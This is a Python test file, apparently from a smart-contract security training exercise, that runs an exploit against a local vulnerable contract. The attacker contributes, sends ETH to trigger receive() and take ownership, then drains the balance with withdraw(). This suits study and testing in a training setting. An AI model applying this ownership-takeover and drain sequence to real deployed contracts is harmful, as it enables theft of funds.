import os

import pytest

from dojo_test_utils import get_web3_instance, load_w3_contract, minimal_tx


@pytest.fixture(scope="module")
def setup_module():
    current_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(current_dir)
    file_name = os.path.basename(__file__)
    print(f": Setting up the module {file_name}")
    challenge_dir = file_name[5:-3]  # ignore "test_" and ".py"
    challenge_dir = os.path.join(parent_dir, challenge_dir)

    print(f'TESTING {challenge_dir}')
    w3 = get_web3_instance()
    vulnerable_contract = load_w3_contract(challenge_dir)
    yield w3, vulnerable_contract
    print(f"\nTearing down the module: {file_name}")


def test_exploit(setup_module):
    w3, vulnerable_contract = setup_module
    deployer = w3.eth.accounts[0]
    attacker = w3.eth.accounts[1]
    assert vulnerable_contract.functions.owner().call() == deployer
    assert vulnerable_contract.functions.owner().call() != attacker
    print('Asserted owner == deployer != attacker')

    # Step 1: contribute to meet requirement
    contribute_amount = w3.to_wei('0.0005', 'ether')
    vulnerable_contract.functions.contribute().transact({'from': attacker, 'value': contribute_amount})
    assert contribute_amount == vulnerable_contract.functions.getContribution().call({'from': attacker})
    print('Asserted contribution ==', w3.from_wei(contribute_amount, 'ether'))

    # Step 2: Trigger `receive()` by sending ETH directly
    tx2 = w3.eth.send_transaction({
        'to': vulnerable_contract.address,
        'from': attacker,
        'value': w3.to_wei(0.001, 'ether')
    })
    tx2 = w3.eth.wait_for_transaction_receipt(tx2)
    print(f"Transaction receipt: {minimal_tx(tx2)}")
    assert tx2.status == 1
    assert attacker == vulnerable_contract.functions.owner().call()
    print('Asserted owner == attacker')

    # Step 3: drain contract
    balance_before = w3.from_wei(w3.eth.get_balance(vulnerable_contract.address), 'ether')
    assert float(balance_before) > 0.0
    print(f"Contract balance before exploit: {balance_before} ETH")
    tx3 = vulnerable_contract.functions.withdraw().transact({'from': attacker})
    tx3 = w3.eth.wait_for_transaction_receipt(tx3)
    print(f"Transaction receipt: {minimal_tx(tx3)}")
    assert tx3.status == 1
    balance_after = w3.from_wei(w3.eth.get_balance(vulnerable_contract.address), 'ether')
    assert float(balance_after) == 0.0
    print(f"Contract balance after exploit: {balance_after} ETH")
